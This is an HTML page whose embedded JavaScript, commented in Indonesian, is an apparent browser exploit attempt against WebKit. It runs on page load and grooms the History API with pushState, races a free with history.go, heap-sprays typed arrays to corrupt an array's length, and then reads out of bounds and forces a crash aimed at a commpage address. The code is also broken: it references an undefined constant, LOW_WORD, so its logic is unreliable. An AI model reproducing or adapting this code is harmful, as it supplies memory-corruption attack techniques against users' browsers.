<!DOCTYPE html>
<html>
<head>
    <title>History API State Corruption V2 (Length Confusion)</title>
</head>
<body>

    <h1>History API State Corruption V2 (Length Confusion)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan Serangan History API V2...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        // Kita hanya akan menargetkan LOW_WORD (32-bit) untuk menimpa Length
        const TARGET_LENGTH_VALUE = LOW_WORD; 

        let startTime = performance.now();
        let payloadHolders = []; 
        let victimArray = null; 

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD (Target Length) ---
        function sprayPayload() {
            log("Memulai Spraying Payload (Targeting Length)...", "log-spray");
            const SPRAY_COUNT = 1500;
            // Gunakan TypedArray yang memiliki ukuran 32-bit (untuk menimpa length)
            const PAYLOAD_SIZE = 1000; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Uint32Array(PAYLOAD_SIZE);
                // Tempatkan LOW_WORD (Commpage Address) di lokasi yang strategis
                payloadArray[3] = TARGET_LENGTH_VALUE; // Lokasi target length/type
                payloadArray[4] = 0x41414141; 
                payloadHolders.push(payloadArray); 
            }
        }

        // --- FUNGSI UTAMA ATTACK ---
        function runHistoryAttack() {
            startTime = performance.now();
            log("Phase 1: History Grooming & Victim Array Setup.", "log-init");

            const HISTORY_COUNT = 100;
            const STATE_ARRAY_SIZE = 1024 * 10; // Ukuran kecil untuk Type Confusion
            
            // 1. Grooming dengan History State
            for (let i = 0; i < HISTORY_COUNT; i++) {
                let stateArray = new Int32Array(STATE_ARRAY_SIZE);
                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
            }
            log(`Phase 2: ${HISTORY_COUNT} History State dibuat.`, "log-info");
            
            // 2. Alokasi Array Korban di Heap yang sama dengan History State
            victimArray = new Int32Array(STATE_ARRAY_SIZE);
            victimArray.fill(0xBBBBBBBB); // Pola unik

            // 3. FREE/SPRAY Race
            setTimeout(() => {
                log("Phase 3: Navigasi Cepat & Memicu FREE...", "log-critical");
                
                // Kembali ke state paling awal (memaksa WebKit me-free state yang tidak terpakai)
                window.history.go(-HISTORY_COUNT);
                
                // Lakukan Spray Payload (Menimpa Length/Header)
                sprayPayload(); 
                
                // 4. Trigger Eksploitasi: Akses Array Korban
                // Kita berharap salah satu alokasi spray menimpa length/header victimArray
                
                try {
                    log(`Mengecek length victimArray: ${victimArray.length}`, "log-critical");
                    
                    // Coba akses memori Out-of-Bounds (OOB) yang sekarang mungkin di luar batas
                    const OOB_INDEX = victimArray.length + 500; 
                    
                    // Jika length ditimpa, akses ini akan meluas ke area memori yang dispray
                    const crashValue = victimArray[OOB_INDEX];
                    
                    log(`Nilai OOB dibaca: 0x${crashValue.toString(16)}`, "log-critical");

                    // Jika crashValue sama dengan Commpage Address (LOW_WORD)
                    if (crashValue === TARGET_LENGTH_VALUE) {
                        log("SUCCESS: Length Corruption dan Commpage Address Ditemukan!", "log-success");
                    }
                    
                    // Trigger Final (memaksa crash di JIT)
                    let finalArray = new Array(crashValue); // Jika crashValue adalah alamat, crash di alokasi
                    finalArray.fill(0);

                } catch(e) {
                     log(`JS Exception: ${e.message} - Menunggu Crash OS.`, "log-critical");
                }

            }, 50); 
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian History API V2...';
            setTimeout(runHistoryAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Length Corruption.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
    </style>
</body>
</html>
